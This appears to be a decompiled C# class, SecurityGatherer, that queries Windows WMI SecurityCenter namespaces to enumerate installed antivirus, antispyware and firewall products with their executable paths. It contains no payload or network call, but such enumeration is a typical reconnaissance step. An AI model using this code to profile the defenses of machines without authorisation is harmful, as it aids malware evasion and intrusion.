using NoiseMe.Drags.App.Models.WMI.Enums;
using NoiseMe.Drags.App.Models.WMI.Objects;
using System;
using System.Collections.Generic;
using System.Management;

namespace NoiseMe.Drags.App.Data.WMI
{
	public static class SecurityGatherer
	{
		private static string SecurityScope;

		static SecurityGatherer()
		{
			bool num = Environment.OSVersion.Platform == PlatformID.Win32NT;
			bool flag = Environment.OSVersion.Version.Major >= 6;
			SecurityScope = ((num & flag) ? "ROOT\\SecurityCenter2" : "ROOT\\SecurityCenter");
		}

		public static ICollection<SecurityProduct> GetSecurityProducts(SecurityProductType productType)
		{
			List<SecurityProduct> list = new List<SecurityProduct>();
			ManagementScope scope = new ManagementScope(SecurityScope);
			string[] properties = new string[2]
			{
				"displayName",
				"pathToSignedProductExe"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection;
			switch (productType)
			{
			case SecurityProductType.AntiVirus:
				wmiInstanceClassCollection = WmiInstance.Query("AntivirusProduct", properties, scope);
				break;
			case SecurityProductType.AntiSpyware:
				wmiInstanceClassCollection = WmiInstance.Query("AntiSpyWareProduct", properties, scope);
				break;
			case SecurityProductType.Firewall:
				wmiInstanceClassCollection = WmiInstance.Query("FirewallProduct", properties, scope);
				break;
			default:
				wmiInstanceClassCollection = null;
				break;
			}
			if (wmiInstanceClassCollection == null)
			{
				return list;
			}
			foreach (WmiInstanceClass item2 in wmiInstanceClassCollection)
			{
				SecurityProduct item = new SecurityProduct((string)item2["displayName"].Value, (string)item2["pathToSignedProductExe"].Value);
				list.Add(item);
			}
			return list;
		}
	}
}
